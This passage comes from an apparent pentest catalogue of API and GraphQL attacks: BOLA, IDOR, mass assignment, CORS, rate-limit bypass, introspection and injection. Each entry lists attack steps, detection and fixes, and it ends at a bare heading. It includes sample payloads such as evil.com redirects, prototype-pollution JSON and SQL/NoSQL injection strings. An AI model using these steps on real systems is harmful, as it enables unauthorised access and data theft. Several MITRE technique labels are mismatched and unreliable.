- **Attack Steps**: Step 1: Discover if the target server accepts HTTP PUT requests by sending test PUT requests to various endpoints. Step 2: Attempt to upload or overwrite files in webroot or critical directories using PUT, such as /index.html or config files. Step 3: Confirm if uploaded files are accessible and executed by the server (e.g., upload a webshell or simple HTML file). Step 4: If allowed, use this method to replace existing application files or configuration, potentially inserting malicious code or disabling security features. Step 5: Verify by accessing the overwritten files via browser or direct requests to confirm changes. Step 6: Use proxy tools to automate testing of multiple files and directories for PUT permission. Step 7: Assess if authentication or authorization is required; if not, this indicates serious misconfiguration. Step 8: Document all writable endpoints and successful overwrites. Step 9: Advise disabling HTTP PUT or limiting it only to trusted authenticated users. Step 10: After mitigation, retest to confirm PUT requests are properly rejected or secured.
- **Detection**: Monitor logs for PUT requests; detect unauthorized file changes
- **Solution**: Disable PUT method on production servers; restrict file write permissions; validate uploads
- **Tags**: HTTP PUT Abuse, File Upload

## Lack of Authentication on Admin API Endpoints

- **Attack Type**: Missing Authentication
- **Target**: APIs, Servers
- **Vulnerability**: Missing authentication on sensitive endpoints
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Complete admin takeover, data breaches
- **Tools**: Postman, Burp Suite, curl
- **Scenario**: Admin API endpoints are exposed without requiring authentication, allowing attackers to access sensitive administrative functions freely.
- **Attack Steps**: Step 1: Enumerate all API endpoints using documentation, proxies, or automated scanners. Step 2: Identify API endpoints clearly intended for admin use, often by their path (e.g., /api/admin/*). Step 3: Attempt to access these endpoints using tools like Postman or curl without providing any authentication tokens or credentials. Step 4: Observe if the server returns sensitive data or allows admin actions despite missing authentication. Step 5: Test common admin functions like user management, configuration changes, or sensitive data access. Step 6: Verify whether any session or token is required, or if anonymous access is allowed. Step 7: Document all admin endpoints accessible without authentication. Step 8: Use automated tools to crawl and test all endpoints for authentication enforcement. Step 9: Report the vulnerability emphasizing risk of total system compromise. Step 10: Recommend enforcing strict authentication and authorization checks on all admin endpoints and regularly auditing API security.
- **Detection**: Scan for unauthenticated sensitive endpoint access; analyze logs for anonymous admin requests
- **Solution**: Implement authentication on all admin endpoints; use role-based access control (RBAC)
- **Tags**: Missing Auth, Admin API Security

## Broken Object Level Authorization (BOLA) in REST APIs

- **Attack Type**: Authorization Bypass
- **Target**: APIs, Servers
- **Vulnerability**: Broken authorization checks
- **MITRE**: T1531 – Account Access Removal
- **Impact**: Data leaks, privilege escalation, account takeover
- **Tools**: Burp Suite, Postman
- **Scenario**: Attackers exploit lack of proper authorization checks on object-level API requests, allowing access or modification of resources belonging to other users.
- **Attack Steps**: Step 1: Identify API endpoints that accept object identifiers (e.g., user IDs, order IDs) as parameters in the URL or request body. Step 2: Authenticate as a normal user and capture valid API requests accessing user-specific data. Step 3: Modify the object identifiers in the requests to IDs belonging to other users. Step 4: Send these modified requests and observe if the server returns or modifies data for objects not owned by the authenticated user. Step 5: Confirm lack of proper authorization by successfully reading or changing another user’s data. Step 6: Repeat testing with different object types (files, orders, profiles) to assess scope. Step 7: Use automated tools to fuzz object IDs and detect unauthorized access. Step 8: Document findings with proof-of-concept requests and responses. Step 9: Suggest fixing by enforcing strict server-side authorization checks for every object access, verifying user ownership or permissions. Step 10: Retest after fixes to ensure BOLA is remediated and no unauthorized access is possible.
- **Detection**: Monitor logs for unauthorized object accesses; implement anomaly detection on unusual resource usage
- **Solution**: Enforce object ownership checks; use centralized authorization logic; implement RBAC
- **Tags**: BOLA, Authorization Bypass

## Mass Assignment Vulnerabilities in REST APIs

- **Attack Type**: Parameter/Property Injection
- **Target**: REST APIs, Servers
- **Vulnerability**: Mass assignment, lack of input filtering
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Unauthorized privilege escalation, data tampering
- **Tools**: Burp Suite, Postman, OWASP ZAP
- **Scenario**: Attackers exploit APIs that automatically bind client-supplied data to server-side objects without filtering, allowing overwriting of unintended fields (e.g., roles, permissions).
- **Attack Steps**: Step 1: Understand that some APIs automatically map all incoming JSON or form parameters to backend data models. Step 2: Identify API endpoints that accept large data objects (e.g., user profile updates). Step 3: Intercept a normal API request and analyze parameters sent. Step 4: Add extra parameters not intended for client modification, such as isAdmin=true or accountBalance=100000. Step 5: Resend the modified request to the server. Step 6: Observe if unauthorized fields get updated or created due to lack of filtering or whitelisting. Step 7: Test for impact by trying to escalate privileges or modify protected data. Step 8: Repeat testing on different endpoints and objects. Step 9: Document proof-of-concept showing unauthorized changes. Step 10: Suggest fixing by implementing strict input validation, whitelisting allowed fields, and not binding all client data blindly to backend models.
- **Detection**: Monitor unusual parameter submissions; use input validation tools
- **Solution**: Enforce strict parameter whitelisting; validate input server-side; implement least privilege
- **Tags**: Mass Assignment, Parameter Injection

## Excessive Data Exposure via Unfiltered API Responses

- **Attack Type**: Information Disclosure
- **Target**: REST APIs, Servers
- **Vulnerability**: Excessive data exposure, poor response filtering
- **MITRE**: T1531 – Account Access Removal
- **Impact**: Data leaks, privacy violation
- **Tools**: Postman, Burp Suite, API Fuzzers
- **Scenario**: APIs return more data than necessary in responses, exposing sensitive information like passwords, keys, or internal IDs unintentionally to clients.
- **Attack Steps**: Step 1: Identify API endpoints returning JSON or XML responses with user or system data. Step 2: Capture and inspect responses to see if they include sensitive fields (e.g., password hashes, API keys, internal identifiers). Step 3: Test if modifying request parameters changes the amount or type of data returned (e.g., query parameters controlling fields). Step 4: Use automated tools to fuzz API responses and discover hidden data. Step 5: Analyze if different user roles receive appropriate filtered data or if data leakage occurs. Step 6: Document examples of sensitive data exposed unintentionally. Step 7: Explore if the leaked data can be used for further attacks like credential stuffing or lateral movement. Step 8: Report findings emphasizing data exposure risks. Step 9: Recommend response filtering, minimizing data sent, and applying the principle of least privilege on data returned. Step 10: Retest after fixes to confirm sensitive data is no longer exposed.
- **Detection**: Monitor API responses for sensitive info; use data leakage detection tools
- **Solution**: Filter API responses; return only necessary data; implement role-based data access
- **Tags**: Data Exposure, API Security

## API Endpoint Enumeration via Predictable URLs

- **Attack Type**: Resource Discovery
- **Target**: REST APIs, Servers
- **Vulnerability**: Endpoint enumeration, predictable URL patterns
- **MITRE**: T1590 – Gather Victim Network Information
- **Impact**: Reconnaissance, increased attack surface
- **Tools**: Burp Suite, Dirbuster, OWASP ZAP
- **Scenario**: Attackers discover API endpoints by guessing or brute forcing predictable URL patterns, exposing functionality or sensitive operations not intended for public access.
- **Attack Steps**: Step 1: Review publicly known API endpoint structures or documentation to identify URL patterns (e.g., /api/v1/users/, /api/v1/orders/). Step 2: Use automated directory brute forcing tools like Dirbuster or Burp Suite to send requests for common endpoint names and numbers (e.g., /api/v1/admin, /api/v1/user/1234). Step 3: Analyze server responses for existence or status codes indicating valid endpoints (e.g., 200 OK vs 404 Not Found). Step 4: Enumerate all discovered endpoints and note functionality available on each. Step 5: Attempt accessing discovered endpoints without authentication to check if any are unprotected. Step 6: Use fuzzing to discover undocumented or hidden endpoints that may leak sensitive functionality. Step 7: Document all accessible endpoints, including any admin or sensitive ones exposed by poor URL design. Step 8: Share findings with dev teams to fix exposure. Step 9: Recommend API gateway use, endpoint obfuscation, and strict access controls. Step 10: Retest post-remediation to confirm endpoints are protected or hidden properly.
- **Detection**: Monitor logs for enumeration patterns; detect scanning activity
- **Solution**: Use unpredictable endpoint naming; apply authentication; employ rate limiting
- **Tags**: Endpoint Enumeration, Reconnaissance

## Insecure Direct Object Reference (IDOR) in APIs

- **Attack Type**: Authorization Bypass
- **Target**: REST APIs, Servers
- **Vulnerability**: Broken authorization, IDOR
- **MITRE**: T1531 – Account Access Removal
- **Impact**: Data leakage, unauthorized data modification
- **Tools**: Burp Suite, Postman
- **Scenario**: Attackers manipulate object identifiers in API requests to access or modify resources they should not have access to, due to missing or broken authorization controls.
- **Attack Steps**: Step 1: Identify API endpoints that accept resource IDs as parameters (e.g., /api/v1/orders/{orderId}). Step 2: Authenticate as a normal user and capture valid requests retrieving or modifying objects owned by that user. Step 3: Modify the object IDs in the captured requests to IDs belonging to other users or objects. Step 4: Send modified requests and observe if the server returns data or allows modifications on unauthorized objects. Step 5: Test various object types like files, profiles, orders, or transactions. Step 6: Use automated fuzzers to iterate over object IDs for extensive testing. Step 7: Confirm vulnerability by accessing or changing data without permission. Step 8: Document with proof-of-concept. Step 9: Suggest fixing by enforcing strict server-side authorization and ownership checks for every object access. Step 10: Retest to verify that unauthorized access is no longer possible.
- **Detection**: Monitor logs for cross-user object access; detect abnormal access patterns
- **Solution**: Implement object ownership validation; enforce access control checks
- **Tags**: IDOR, Authorization Bypass

## Using Insecure HTTP Instead of HTTPS for API Calls

- **Attack Type**: Network Traffic Interception
- **Target**: APIs, Networks
- **Vulnerability**: Lack of encryption (plaintext HTTP)
- **MITRE**: T1040 – Network Sniffing
- **Impact**: Data theft, session hijacking, request tampering
- **Tools**: Wireshark, Burp Suite, tcpdump
- **Scenario**: APIs using insecure HTTP protocol allow attackers to sniff or modify data in transit, leading to credential theft, session hijacking, or data manipulation.
- **Attack Steps**: Step 1: Identify APIs accessible via insecure HTTP instead of HTTPS. Step 2: Use network sniffing tools like Wireshark or tcpdump on the same network segment to capture API traffic. Step 3: Analyze captured packets for sensitive data such as API keys, tokens, credentials, or personal data sent in plaintext. Step 4: Perform man-in-the-middle (MITM) attacks using proxy tools (Burp Suite) to intercept and manipulate API requests and responses. Step 5: Modify API requests to escalate privileges, replay valid tokens, or inject malicious payloads. Step 6: Confirm the impact by observing unauthorized access or altered server responses. Step 7: Document lack of encryption as a critical risk. Step 8: Recommend enforcing HTTPS for all API communications, including strict TLS configurations and HSTS headers. Step 9: Test post-fix to verify all API traffic is encrypted and secure. Step 10: Educate developers and ops teams about risks of HTTP and importance of encryption.
- **Detection**: Monitor for HTTP traffic on sensitive endpoints; detect MITM activity
- **Solution**: Enforce HTTPS everywhere; use TLS; implement HSTS; disable HTTP access
- **Tags**: HTTPS Enforcement, Network Security

## Unvalidated Redirects in API Response Headers

- **Attack Type**: Open Redirect via API Header Manipulation
- **Target**: REST APIs, Web Clients
- **Vulnerability**: Lack of URL validation in redirects
- **MITRE**: T1204.001 – User Execution: Malicious Link
- **Impact**: Credential theft, phishing, session hijack
- **Tools**: Burp Suite, curl, Postman
- **Scenario**: API responses include user-controllable URLs in headers (like Location:), allowing redirection to malicious domains, enabling phishing or token theft.
- **Attack Steps**: Step 1: Find an API endpoint that performs redirection and accepts a URL as a query parameter (e.g., /api/redirect?url=https://example.com). Step 2: Modify the url parameter to a malicious domain under your control (e.g., https://evil.com). Step 3: Send the request and check if the response header includes a Location: https://evil.com and the browser or client is redirected to the malicious site. Step 4: This proves the API is redirecting without validating the destination. Step 5: Embed this malicious link in phishing emails or pages to trick users into thinking they are going to a trusted domain but are redirected silently. Step 6: Monitor network requests to confirm redirection to attacker-controlled domains. Step 7: Use these redirects to capture session tokens, login credentials, or trick users into downloading malware. Step 8: Document the vulnerable endpoint and payload used. Step 9: Recommend implementing a whitelist of allowed redirect URLs or validating the destination before redirecting. Step 10: Retest after fix to confirm redirects are now safe or blocked.
- **Detection**: Analyze response headers for open redirect vectors; scan parameters like url, next, redirect
- **Solution**: Implement URL whitelisting or signed redirect tokens; validate redirects strictly
- **Tags**: Open Redirect, Header Injection

## JSON Injection in REST API Input

- **Attack Type**: Input Injection / API Injection
- **Target**: REST APIs, Backends
- **Vulnerability**: Lack of JSON structure sanitization
- **MITRE**: T1059.007 – Scripting: JSON Injection
- **Impact**: Logic abuse, privilege escalation, code injection
- **Tools**: Burp Suite, Postman, OWASP ZAP
- **Scenario**: APIs fail to sanitize user input embedded in JSON structures, allowing injection of new keys, unexpected values, or code, leading to logic abuse or system compromise.
- **Attack Steps**: Step 1: Identify API endpoints accepting JSON input in request bodies. Step 2: Intercept and analyze the JSON data being sent from the client to the server. Step 3: Modify the structure by injecting new keys or malformed JSON fragments (e.g., {"role":"user", "__proto__":{"isAdmin":true}}). Step 4: Resend the modified payload to the API server and observe the behavior. Step 5: Test if the server accepts and parses the payload, and if injected fields override expected logic (e.g., escalate privileges or cause backend crashes). Step 6: Look for signs of prototype pollution, logic bypass, or application misbehavior. Step 7: Try sending deeply nested JSON payloads or escaping quotes/brackets to bypass parsing protections. Step 8: Use a proxy to automate fuzzing with different injection vectors. Step 9: Confirm success if the backend changes behavior or returns unexpected data. Step 10: Recommend strong input validation, JSON schema enforcement, and sanitization of nested objects before deserialization.
- **Detection**: Analyze request bodies; log and inspect JSON input variations; enforce schema validation
- **Solution**: Use JSON schema validators; reject unknown fields; sanitize input before processing
- **Tags**: JSON Injection, Prototype Pollution

## Race Conditions in API Transactions Leading to Double Spending

- **Attack Type**: API-Level Race Condition
- **Target**: REST APIs, Payment Systems
- **Vulnerability**: Missing transaction locking
- **MITRE**: T1499 – Resource Hijacking
- **Impact**: Double spending, coupon abuse, financial fraud
- **Tools**: Burp Suite, curl, Turbo Intruder
- **Scenario**: Attackers exploit timing flaws in financial or transactional APIs by sending rapid, concurrent requests to perform actions multiple times (e.g., using the same coupon or balance twice).
- **Attack Steps**: Step 1: Identify critical API actions that modify server-side state, like payments, coupon redemption, wallet transfers, or inventory updates. Step 2: Test normal request behavior by redeeming a coupon or sending a transaction once. Step 3: Now use Turbo Intruder or a custom script to send multiple identical requests at the exact same time (concurrently), before the server has updated its internal state. Step 4: Observe if multiple transactions succeed despite being meant for single-use only. Step 5: For example, use the same promo code simultaneously to buy multiple products or withdraw the same wallet balance multiple times. Step 6: If success, this confirms the presence of a race condition. Step 7: Capture all request/response logs to prove the race was exploited. Step 8: Attempt the attack from different devices or sessions for realism. Step 9: Recommend server-side locking mechanisms or transaction queuing to prevent this issue. Step 10: Retest by attempting the attack post-fix and confirm only one transaction succeeds.
- **Detection**: Monitor for concurrent identical API calls; check for multiple redemptions of the same resource
- **Solution**: Use server-side locks, atomic operations, and transaction integrity checks
- **Tags**: API Race Condition, Transaction Exploit

## Improper API Pagination Leading to Data Leakage

- **Attack Type**: Information Disclosure via Pagination
- **Target**: REST APIs, Data Services
- **Vulnerability**: Weak pagination logic, missing access control
- **MITRE**: T1119 – Automated Collection
- **Impact**: Data scraping, PII leakage, enumeration
- **Tools**: Postman, Burp Suite, Pagination Fuzzer
- **Scenario**: APIs with poorly implemented pagination expose more data than intended by manipulating offset, page, or limit values, enabling data scraping or access to hidden resources.
- **Attack Steps**: Step 1: Discover API endpoints using pagination parameters like limit, offset, page, or size. Step 2: Test normal usage by requesting the first few pages of data. Step 3: Manually modify parameters to extreme or negative values (e.g., limit=9999, offset=-10) and observe the responses. Step 4: Use fuzzing tools or custom scripts to loop through large ranges of page values to extract all data from the server, including hidden, deleted, or restricted records. Step 5: Watch for records belonging to other users or system-level data. Step 6: If excessive or unauthorized data appears, this indicates poor pagination logic. Step 7: Check for lack of max limits, authentication-based filtering, or access controls. Step 8: Document the leaked data with screenshots and response dumps. Step 9: Recommend implementing proper limit bounds, user scoping, and authentication-based filters. Step 10: Retest with edge-case pagination values to confirm limits and filters are now enforced.
- **Detection**: Monitor for excessive limit or offset; flag large sequential requests from same IP
- **Solution**: Cap pagination sizes; enforce access control per user scope; obfuscate total count fields
- **Tags**: Pagination Abuse, Data Disclosure

## CORS Misconfigurations on API Endpoints

- **Attack Type**: Cross-Origin Resource Sharing Flaws
- **Target**: REST APIs, Browsers
- **Vulnerability**: Misconfigured Access-Control headers
- **MITRE**: T1133 – External Remote Services
- **Impact**: SOP bypass, unauthorized data access
- **Tools**: Browser DevTools, curl, Burp Suite
- **Scenario**: Attackers abuse misconfigured CORS policies (like Access-Control-Allow-Origin: *) to access sensitive APIs from unauthorized web pages, bypassing Same-Origin Policy.
- **Attack Steps**: Step 1: Identify if the API uses CORS by sending OPTIONS requests or inspecting response headers to check Access-Control-Allow-Origin, Allow-Credentials, and Access-Control-Allow-Headers. Step 2: Send requests from a malicious site or script (hosted on attacker domain) to the API and observe if the browser accepts and processes the response. Step 3: If Access-Control-Allow-Origin: * is returned with sensitive data (especially with credentials: true), then CORS is misconfigured. Step 4: Attempt authenticated requests from cross-origin scripts (e.g., JavaScript on evil.com) to retrieve data from APIs. Step 5: Use browser dev tools to confirm the attacker page accesses response data. Step 6: Test by injecting malicious JavaScript that reads and sends sensitive API responses to an attacker server. Step 7: If successful, this bypasses SOP protections. Step 8: Document affected endpoints and insecure headers. Step 9: Recommend fixing by allowing only trusted domains and not enabling credentials with wildcards. Step 10: Retest after applying correct CORS policy headers.
- **Detection**: Scan CORS headers for * origins with sensitive endpoints; analyze access from cross-origin sites
- **Solution**: Restrict CORS to trusted origins; avoid * with credentials; use CORS preflight validation
- **Tags**: CORS, API Misconfiguration

## API Parameter Pollution Causing Unexpected Behavior

- **Attack Type**: Parameter Injection / Input Pollution
- **Target**: REST APIs, Web Apps
- **Vulnerability**: Poor input parsing or parameter validation
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Access control bypass, logic confusion
- **Tools**: Burp Suite, Postman, curl
- **Scenario**: APIs may incorrectly process multiple parameters with the same name, allowing attackers to manipulate request behavior, bypass filters, or corrupt logic.
- **Attack Steps**: Step 1: Identify an API endpoint that accepts parameters in query strings or request bodies (e.g., /api/products?sort=price). Step 2: Modify the request to include the same parameter multiple times (e.g., /api/products?sort=price&sort=id). Step 3: Observe if the server accepts the request and how it handles the conflicting parameters. Step 4: Try this with security-sensitive parameters like isAdmin=false&isAdmin=true or userId=123&userId=999. Step 5: Check if one parameter overrides the other or if both are used, leading to broken logic. Step 6: Attempt bypassing access controls or filters (e.g., pollute role=user&role=admin). Step 7: Use automated tools to test various combinations of repeated parameters in both GET and POST requests. Step 8: If unintended behavior occurs (e.g., accessing another user's data), document the response and conditions. Step 9: Recommend strict server-side validation to reject multiple same-name parameters. Step 10: Retest to confirm proper handling and rejection of polluted requests.
- **Detection**: Analyze request logs for repeated parameter names; detect abnormal request patterns
- **Solution**: Use strict parameter parsing; reject duplicate parameters; normalize input
- **Tags**: API Pollution, Parameter Injection

## Insecure Use of API Keys in Public Clients

- **Attack Type**: Credential Leakage via Public Exposure
- **Target**: REST APIs, Mobile/Web Apps
- **Vulnerability**: Insecure key management
- **MITRE**: T1552 – Unsecured Credentials
- **Impact**: Unauthorized access, quota abuse, privilege escalation
- **Tools**: Chrome DevTools, apktool, JS Beautifier
- **Scenario**: API keys are hardcoded in frontend (JavaScript, mobile apps), allowing attackers to extract them and use APIs without authorization or rate limits.
- **Attack Steps**: Step 1: Open a website or mobile app using browser developer tools or decompile its APK using apktool. Step 2: Search for hardcoded strings like apiKey, secret, or Authorization. Step 3: If an API key is found in JavaScript or mobile assets, copy it. Step 4: Replay API requests using tools like curl or Postman and add the key to the header (e.g., Authorization: Bearer <key>). Step 5: Confirm if the server accepts the key and performs actions (e.g., fetch user data, access resources). Step 6: Try to modify request parameters to test if the key has elevated privileges or access to other users’ data. Step 7: Test key reuse for rate limits, geographic limits, or scope violations. Step 8: If successful, this confirms the key is exposed and reusable. Step 9: Recommend storing keys in server-side environments only, never on clients. Step 10: After remediation, verify no credentials are sent or stored in public clients.
- **Detection**: Scan static assets for embedded secrets; monitor key usage by IP, origin, or device type
- **Solution**: Store API keys in secure backend services; use short-lived tokens; rotate keys frequently
- **Tags**: API Key Leak, Client-Side Exposure

## Insufficient Logging and Monitoring of API Calls

- **Attack Type**: Logging Failures / Blind Spots
- **Target**: REST APIs, Backend Logs
- **Vulnerability**: Lack of logging, missing API monitoring
- **MITRE**: T1087.001 – Credentials Collection: API Abuse
- **Impact**: Stealthy attacks, no audit trail, delayed response
- **Tools**: OWASP ZAP, SIEM, Burp Suite
- **Scenario**: APIs do not log critical actions or abuse attempts, making it hard to detect, investigate, or respond to attacks like brute-force, IDOR, or race conditions.
- **Attack Steps**: Step 1: Interact with various API endpoints, including successful and failed login attempts, invalid requests, malformed tokens, and unauthorized access. Step 2: Check server logs (if accessible) or ask developers/ops if such actions were logged. Step 3: Repeatedly send invalid parameters or brute-force test login and password reset endpoints. Step 4: Attempt IDOR attacks or race condition exploits. Step 5: Note if any alert is triggered or if the actions go unnoticed. Step 6: Try evading monitoring by modifying headers like User-Agent, Referrer, and see if requests are still tracked. Step 7: If no logging or alerts are generated, this confirms poor monitoring. Step 8: Recommend implementing centralized logging (SIEM) and alert rules for sensitive API actions. Step 9: Apply rate-limit alerts, anomaly detection, and IP reputation filters. Step 10: Test again to verify that key API interactions are being properly logged and monitored in real-time.
- **Detection**: Check SIEM or log system for visibility into API traffic; audit log completeness
- **Solution**: Enable API auditing; log sensitive operations; monitor for anomalies
- **Tags**: API Logging, Monitoring Failures

## Abuse of API Rate Limiting Bypass Techniques

- **Attack Type**: Rate Limit Evasion / Throttling Abuse
- **Target**: REST APIs, Authentication
- **Vulnerability**: Weak rate limit enforcement
- **MITRE**: T1499 – Endpoint DoS / Resource Abuse
- **Impact**: Brute-force login, resource exhaustion, data scraping
- **Tools**: Burp Suite, VPN, TOR, curl
- **Scenario**: Attackers use tricks like rotating IPs, manipulating headers, or using TOR to bypass rate limiting protections and overwhelm or abuse the API.
- **Attack Steps**: Step 1: Identify an API endpoint protected by rate limiting (e.g., login, OTP, password reset). Step 2: Send a few requests and trigger the rate limit block. Step 3: Try changing the X-Forwarded-For, X-Real-IP, or Client-IP headers to spoof different IPs. Step 4: Observe if the API treats spoofed headers as new clients and resets rate limits. Step 5: Now try the same attack from different network sources (VPNs, TOR nodes, proxy services). Step 6: If the server uses IP-based rate limiting only, this allows you to flood the endpoint again. Step 7: Chain this with account enumeration, OTP spamming, or resource exhaustion. Step 8: If successful, it means the rate limiting logic is client-spoofable or ineffective. Step 9: Recommend implementing server-side IP reputation, CAPTCHA, session-based rate limiting, and header validation. Step 10: Retest with spoofed headers and rotated IPs to confirm protections work against bypass techniques.
- **Detection**: Analyze request patterns from different IPs, headers; detect abuse through session-level monitoring
- **Solution**: Use per-user, per-session, and behavior-based throttling; validate headers server-side
- **Tags**: API Abuse, Rate Limit Bypass

## API Versioning Misconfiguration Leading to Old Vulnerable APIs Exposure

- **Attack Type**: Legacy API Exposure / Version Control Flaws
- **Target**: REST APIs, Microservices
- **Vulnerability**: Exposure of outdated/insecure API versions
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Use of old bugs, bypass of patches, admin logic abuse
- **Tools**: Postman, Burp Suite, Dirsearch
- **Scenario**: Developers leave outdated or vulnerable API versions accessible (e.g., /v1/, /beta/), exposing systems to previously fixed bugs or deprecated logic.
- **Attack Steps**: Step 1: Test API base URLs like /api/v1/, /api/v2/, /api/beta/, /api/legacy/, or /api/dev/ using common directory brute-forcing tools. Step 2: If multiple versions are accessible, send identical requests to each and compare responses. Step 3: Check if older versions return different behavior or allow unsafe operations (e.g., unfiltered responses, unauthenticated access). Step 4: Use Burp Suite to automate requests to each versioned endpoint with known vulnerable payloads. Step 5: Identify inconsistencies in authorization, rate limits, or field validation. Step 6: Look for features that were removed in newer APIs but still active in legacy ones (e.g., admin access, verbose error messages). Step 7: Document all outdated or redundant endpoints that expose risk. Step 8: Recommend removing or restricting access to deprecated versions. Step 9: Implement API version lifecycle management. Step 10: Retest to ensure legacy versions are either removed or secured with updated controls.
- **Detection**: Monitor API traffic to legacy paths; scan for versioned endpoints
- **Solution**: Deprecate unused versions; add version headers; restrict access via auth and IP
- **Tags**: API Versioning, Legacy Exposure

## GraphQL Introspection Enabled in Production

- **Attack Type**: Excessive API Exposure via Introspection
- **Target**: GraphQL APIs
- **Vulnerability**: Introspection query not disabled in production
- **MITRE**: T1592 – Gather Victim Host Information
- **Impact**: Sensitive API mapping, reverse engineering of backend
- **Tools**: GraphiQL, curl, Burp Suite
- **Scenario**: GraphQL introspection queries are enabled in production, allowing attackers to enumerate all available types, fields, and mutations, revealing internal APIs and business logic.
- **Attack Steps**: Step 1: Visit the GraphQL endpoint (commonly /graphql). Step 2: Submit an introspection query like {"query":"{__schema { types { name fields { name } } } }"} using Postman, curl, or GraphiQL. Step 3: If introspection is enabled, the server responds with full schema details including query/mutation names, field names, data types, nested relationships, and documentation strings. Step 4: Use this information to map the backend structure and find sensitive functions or fields (e.g., resetPassword, getUserById, adminOnlyFields). Step 5: Document all exposed types and potentially sensitive fields. Step 6: Attempt to access or call sensitive mutations using the schema. Step 7: Recommend disabling introspection in production environments or restricting it by role. Step 8: Re-test after changes to confirm introspection returns a 403 or null schema.
- **Detection**: Monitor for schema introspection queries; log all __schema or __type calls
- **Solution**: Disable introspection in production; limit access to dev/test only
- **Tags**: GraphQL Introspection, Schema Discovery

## Mass Assignment via Input Objects in GraphQL Mutations

- **Attack Type**: Unfiltered Input Object Injection
- **Target**: GraphQL APIs
- **Vulnerability**: Lack of field-level filtering in input objects
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Privilege escalation, logic abuse
- **Tools**: GraphiQL, Postman, Burp Suite
- **Scenario**: GraphQL input objects are automatically mapped to backend models without whitelisting, allowing attackers to assign unauthorized properties (e.g., role, isAdmin, status).
- **Attack Steps**: Step 1: Identify a GraphQL mutation that takes input objects (e.g., updateUser(input: UserInput!)). Step 2: Submit a standard mutation with allowed fields like name or email. Step 3: Modify the input object to include extra fields not present in the frontend form but present in the backend model (e.g., {"email":"test@x.com", "role":"admin"}). Step 4: Send the mutated payload using GraphiQL or Postman. Step 5: Observe if the server updates or accepts unauthorized fields like role, isAdmin, or status. Step 6: Confirm privilege escalation if mutation accepts and persists these changes. Step 7: Repeat for other object-based mutations (e.g., product, settings, config). Step 8: Document affected mutations and input objects. Step 9: Recommend using input schema validation and backend field whitelisting. Step 10: Retest by resending polluted input and ensure unauthorized fields are rejected.
- **Detection**: Log mutation input field changes; detect unusual fields not in frontend form
- **Solution**: Whitelist allowed input fields; validate input against a strict schema
- **Tags**: GraphQL Mutation Abuse, Mass Assignment

## Query Batching Leading to Unauthorized Data Exposure

- **Attack Type**: Overfetching and Access Control Bypass
- **Target**: GraphQL APIs
- **Vulnerability**: Improper access control for batched queries
- **MITRE**: T1531 – Account Access Removal
- **Impact**: Leakage of protected data, API misuse
- **Tools**: GraphiQL, Postman, curl
- **Scenario**: Attackers use GraphQL’s query batching feature to combine multiple operations into a single request, sometimes bypassing per-query access control and leaking unauthorized data.
- **Attack Steps**: Step 1: Test if the GraphQL endpoint supports batching by sending multiple queries in an array (e.g., [{"query":"{me {id name}}"},{"query":"{adminStats}"}]). Step 2: If the server accepts the batch and returns responses to both queries, it confirms batching is allowed. Step 3: Try combining public and sensitive/private queries in the same batch to bypass authorization checks. Step 4: Observe if protected data (e.g., user roles, admin stats, or internal logs) is returned despite lacking appropriate roles. Step 5: Repeat with combinations of GET and POST methods and different headers (e.g., missing auth token). Step 6: Use the introspected schema to find sensitive queries to batch. Step 7: Document cases where access control fails under batch processing. Step 8: Recommend disabling query batching or enforcing authorization for each operation within the batch. Step 9: Re-test by submitting unauthorized queries in a batch after patching. Step 10: Confirm batching is either disabled or properly secured.
- **Detection**: Monitor for batched queries with mixed access scopes; check per-query auth
- **Solution**: Validate each query in batch independently; log and restrict sensitive operations
- **Tags**: GraphQL Batching, Overfetching, Authorization

## Field Aliasing to Bypass Security Filters in GraphQL

- **Attack Type**: Field Renaming / Bypass via Aliases
- **Target**: GraphQL APIs
- **Vulnerability**: Weak filter logic on field names
- **MITRE**: T1565.001 – Stored Data Manipulation
- **Impact**: Authorization bypass, logic leakage
- **Tools**: GraphiQL, Postman, curl
- **Scenario**: Attackers exploit GraphQL’s field aliasing to request blocked or filtered fields (e.g., password, isAdmin) under different names, bypassing blacklist-based access controls.
- **Attack Steps**: Step 1: Discover fields that are restricted or filtered by the frontend or WAF (e.g., password, admin). Step 2: Use GraphQL’s aliasing feature to rename them in your query (e.g., myField: password, elevate: isAdmin). Step 3: Submit the aliased query like query { user { name, elevate: isAdmin } }. Step 4: If the server allows access to aliased fields and returns values, this indicates a filter bypass. Step 5: Repeat the attack with various blacklisted field names. Step 6: Try using Unicode/encoding tricks like \\u0070assword to evade pattern matching filters. Step 7: Use introspection or brute-force to guess internal fields. Step 8: Document successful bypasses with screenshots. Step 9: Recommend not using blacklists; instead, enforce allowlists for fields per role. Step 10: Retest after patching to ensure aliases can’t be used to access restricted fields.
- **Detection**: Log all field access with original and alias names; flag sensitive field access via aliases
- **Solution**: Enforce field allowlists; detect and block alias use on sensitive fields
- **Tags**: GraphQL Aliasing, WAF Bypass, Filter Evasion

## GraphQL Injection Attacks via Malformed Queries

- **Attack Type**: Injection via Query Manipulation
- **Target**: GraphQL APIs
- **Vulnerability**: Improper query sanitization
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Code injection, info disclosure, API denial of service
- **Tools**: Burp Suite, GraphQLmap, Postman
- **Scenario**: Attackers craft malformed or malicious GraphQL queries to perform injection, query manipulation, DoS, or bypass input validation in underlying database layers.
- **Attack Steps**: Step 1: Send standard GraphQL queries and observe how parameters and inputs are handled. Step 2: Begin injecting GraphQL-specific payloads in string fields (e.g., "} } fragment x on Query { __schema { types { name } } }") to break the query structure. Step 3: Attempt database-level injections (SQL, NoSQL) in input fields like username, email, etc., embedded inside GraphQL variables. Step 4: Test payloads like " OR 1=1 --, {"$ne": null}, or { "username": "admin', password: ' OR '1'='1" }. Step 5: If the API responds with internal error messages, stack traces, or data, this indicates vulnerability. Step 6: Attempt nested query attacks to overload parsers and cause DoS. Step 7: Use GraphQLmap to automate common injection payloads and detect vulnerable fields. Step 8: Document queries that cause injection or error-based information leaks. Step 9: Recommend using GraphQL input validation, query depth limiting, and sanitization. Step 10: Retest using fuzzed/malformed queries after patching to ensure safety.
- **Detection**: Monitor for malformed queries; use GraphQL-aware WAF rules; analyze stack traces and query logs
- **Solution**: Validate inputs using GraphQL schema; sanitize all fields; enforce query depth & complexity limits
- **Tags**: GraphQL Injection, Query Tampering

## Excessive Query Complexity Leading to Denial of Service (DoS)

